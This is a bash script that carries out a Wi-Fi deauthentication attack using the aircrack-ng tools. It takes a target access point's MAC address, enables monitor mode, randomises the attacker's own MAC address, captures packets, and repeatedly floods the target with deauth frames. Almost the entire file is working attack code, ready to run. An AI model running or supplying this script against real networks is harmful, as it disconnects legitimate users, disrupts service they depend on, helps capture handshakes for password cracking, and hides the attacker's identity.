#!/bin/bash

# Exit immediately if a command exits with a non-zero status
set -e

# Function to clean up and exit
cleanup() {
    echo "Cleaning up..."
    airmon-ng stop wlan0mon &>/dev/null || true
    service network-manager restart &>/dev/null || true
}

# Set trap to call cleanup function on script exit
trap cleanup EXIT

# Function to run a command with timeout and error handling
run_command() {
    local cmd="$*"
    echo "Running: $cmd"
    timeout 30s bash -c "$cmd" || {
        echo "Error: Command '$cmd' failed or timed out"
        return 1
    }
}

# Function to validate MAC address format
validate_mac_address() {
    local mac="$1"
    [[ $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]
}

# Check if script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
    exit 1
fi

# Prompt for target MAC address
read -p "Enter the target MAC address: " TARGET_MAC

# Validate MAC address format
if ! validate_mac_address "$TARGET_MAC"; then
    echo "Invalid MAC address format. Please use XX:XX:XX:XX:XX:XX."
    exit 1
fi

# Start monitor mode
run_command airmon-ng start wlan0
sleep 7

# Configure interface
run_command ifconfig wlan0mon down
sleep 1
run_command macchanger -r wlan0mon
sleep 2
run_command ifconfig wlan0mon up

# Start packet capture in the background
run_command airodump-ng wlan0mon -c 6 &
AIRODUMP_PID=$!

# Perform deauthentication loop
echo "Starting deauthentication attack..."
for i in {1..200}; do
    run_command aireplay-ng --deauth 5 -a "$TARGET_MAC" wlan0mon
    sleep 5
done

# Terminate packet capture process
echo "Stopping packet capture..."
kill "$AIRODUMP_PID" &>/dev/null || true

# Cleanup is handled by the trap
echo "Script execution completed."
